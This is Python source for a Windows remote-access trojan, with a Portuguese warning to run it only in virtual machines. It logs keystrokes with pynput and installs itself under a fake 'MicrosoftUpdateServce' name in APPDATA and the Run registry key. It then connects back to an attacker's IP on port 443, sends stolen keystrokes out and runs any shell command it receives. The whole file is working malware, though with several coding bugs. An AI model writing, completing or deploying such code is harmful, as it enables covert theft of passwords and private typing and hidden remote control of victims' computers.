from datetime import datetime
from pynput import keyboard
from time import time

import subprocess
import shutil
import socket
import winreg
import os
import sys

#WARNING : NUNCA EXECUTE ESSE MALWARE NO SEU PROPRIO PC , SE FOR TESTAR , TESTE EM MAQUINAS VIRTUAIS 

IP = ''
PORT = 443
PROGRAM_NAME = 'MicrosoftUpdateServce'
REGISTRY_KEY_PATH = r'Software\Microsoft\Windows\CurrentVersion\Run'
MAX_BUFFER_SIZE = 500

keylog_buffer = []
buffer_auto_send_pending = False
keylloger_active = False
listener = None

def format_key(key):
    try:
        return key.char
    except AttributeError:
        special_keys = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '[ENTER]',
            keyboard.Key.tab: '[TAB]',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.shift: '',
            keyboard.Key.ctrl: '',
            keyboard.Key.alt: ''
        }
        return special_keys.get(key, f'[{key.name.upper()}]')

def on_press(key):
    global keylog_buffer, buffer_auto_send_pending
    
    formatted  = format_key(key)
    if formatted and len(keylog_buffer) < MAX_BUFFER_SIZE:
        keylog_buffer.append(formatted)
    
    if len(keylog_buffer) >= MAX_BUFFER_SIZE:
        buffer_auto_send_pending = True

def get_keylog_data():
    global keylog_buffer
    
    if not keylog_buffer:
        return '[i] Keylog buffer is empty'
    
    timestamp = datetime.now().strftime('%Y-%m-%d  %H:%M:%S')
    data = f'[+] Keylog captured at {timestamp}:\n{''.join(keylog_buffer)}'
    keylog_buffer = []
    return data

def start_keylogger():
    global keylloger_active, listener
    
    if keylloger_active:
        return '[i] Keylloger already running'
    
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    keylloger_active = True
    return '[+] Keylogger started'

def stop_keylogger():
    global keylloger_active, listener
    
    if not keylloger_active:
        return '[i] Keylogger not running'

    if listener:
        listener.stop()

    keylloger_active = False
    return '[+] Keylogger stopped'

def copy_to_system():
    try:
        appdata_path = os.path.join(os.getenv(('APPDATA'), 'Microsoft', 'Windows'))
        if not os.path.exists(appdata_path):
            os.makedirs(appdata_path)

        current_file = sys.executable
        destination = os.path.join(appdata_path, f'{PROGRAM_NAME}.exe')

        if os.path.abspath(current_file) != os.path.abspath(destination):
            shutil.copy2(current_file, destination)
            return destination
        return current_file

    except Exception as e:
        print(f'[-] Error copying file: {e}')
        return sys.executable


def add_to_registry(file_path):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, 
            REGISTRY_KEY_PATH,
            0,
            winreg.KEY_SET_VALUE
        )

        winreg.SetValueEx(
            key,
            PROGRAM_NAME,
            0,
            winreg.REG_SZ,
            file_path
        )

        winreg.CloseKey(key)
        return True

    except Exception as e:
        return False


def check_persistence():

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY_PATH,
            0,
            winreg.KEY_READ
        )

        value, _ = winreg.QueryValueEx(key, PROGRAM_NAME)
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False

    except Exception as e:
        print(f'[-] Error checking persistence: {e}')
        return False

def setup_persistence():

    try:
        if check_persistence():
            return
        persistence_path = copy_to_system()
        add_to_registry(persistence_path)

    except Exception as e:
        print(f'[-] Persistence setup failed: {e}')

def connect(ip, port):

    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((ip, port))
        c.send(b'[#] Cliente connected\n')
        return c

    except Exception as e:
        print(f'[!] Connection Error: {e}')

def listen(c):
    global buffer_auto_send_pending
    
    try:
        while True:
            if buffer_auto_send_pending:
                data = get_keylog_data()
                c.send(f'[AUTO-SEND] {data}\n[AUTO-SEND]\n\n'.encode())
                buffer_auto_send_pending = False
                
                c.settimeout(.5)
                try:
                    data = c.recv(1024).decode().strip()
                    if data == '/exit':
                        return
                    else:
                        cmd(c, data)
                except socket.timeout:
                    continue
                
    except Exception as e:
        print(f'[!] Listen function Error: {e}')


def cmd(c, data):
    try:
        if data.startswith('cd '):
            os.chdir(data[3:].strip())
            c.send(b'[i] Directory Changed\n')
            return
        
        elif data == '/Persistence Status':
            if check_persistence():
                c.send(f'[+] Persistence Status:\n\t[i] Path: {sys.executable}\n\t[i] Registry Key: {REGISTRY_KEY_PATH}\n\t[i] Name: {PROGRAM_NAME}\n\n'.encode)
                return
            else:
                c.send(b'[-] Persistence Status: FAIL\n\n')
                return
        elif data == '/Persistence setup':
            setup_persistence()
            c.send(b'[+] Done\n\n')
            return
        elif data == '/Keylog start':
            response = start_keylogger()
            c.send(response.encode() + b'\n\n')
            return
        elif data == '/Keylog stop':
            response = stop_keylogger()
            c.send(response.encode() + b'\n\n')
            return
        elif data == '/Keylog dump':
            response = get_keylog_data()
            c.send(response.encode() + b'\n\n')
            return
        elif data == '/Keylog status':
            status = 'running' if keylloger_active else 'stopped'
            buffer_size = len(keylog_buffer)
            response = f'[i] keylloger status: {status}\n[i] Buffer:{buffer_size} Keys'
            c.send(response.encode() + b'\n\n')
            return  
        else:
            
            p = subprocess.Popen(
                data,
                shell=True,
                stdin=subprocess.PIPE ,
                stderr=subprocess.PIPE,
                stdout=subprocess.PIPE
            )

            output = p.stdout.read() + p.stderr.read()
            if output:
                c.send(output + b'\n')
            else:
                c.send(b'[+] Command Executed\n\n')

    except Exception as e:
        print(f'CMD Function Error: {e}')

if __name__ == '__main__':

    try:
        setup_persistence()

        while True:
            client = connect(IP, PORT)
            if client:
                list(client)
            else:
                time.sleep(5)
    except KeyboardInterrupt:
        print('[!] Program Stopped by the User! ')
    except Exception as e:
        print(f'[!] Main Connection {e}')